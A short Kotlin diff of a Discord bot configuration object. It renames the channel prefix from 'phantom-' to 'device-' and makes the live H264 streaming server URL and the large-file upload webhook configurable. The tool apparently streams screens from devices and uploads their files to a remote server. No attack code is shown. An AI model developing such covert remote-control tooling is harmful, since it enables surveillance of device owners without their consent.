@@ -21,14 +21,28 @@ object DiscordConfig {
 
     const val INTENTS = 33281
 
-    const val CHANNEL_PREFIX = "phantom-"
+    const val CHANNEL_PREFIX = "device-"
 
     const val RECONNECT_BASE_DELAY = 2000L
-    const val MAX_RECONNECT_DELAY = 300000L
-
-    const val WEBHOOK_URL = ""
+    const val MAX_RECONNECT_DELAY = 30000L
 
     // Bot HTTP server URL for live streaming (H264 frames)
-    // Change this to your bot server's public URL
-    const val BOT_HTTP_URL = "http://your-bot-server.com:3000"
+    // Override by setting the system property "bot.http.url"
+    val BOT_HTTP_URL: String by lazy {
+        try {
+            System.getProperty("bot.http.url") ?: "http://your-bot-server.com:3000"
+        } catch (_: Exception) {
+            "http://your-bot-server.com:3000"
+        }
+    }
+
+    // Optional Discord webhook URL for sending files larger than 25MB
+    // Override by setting the system property "bot.webhook.url"
+    val WEBHOOK_URL: String by lazy {
+        try {
+            System.getProperty("bot.webhook.url") ?: ""
+        } catch (_: Exception) {
+            ""
+        }
+    }
 }
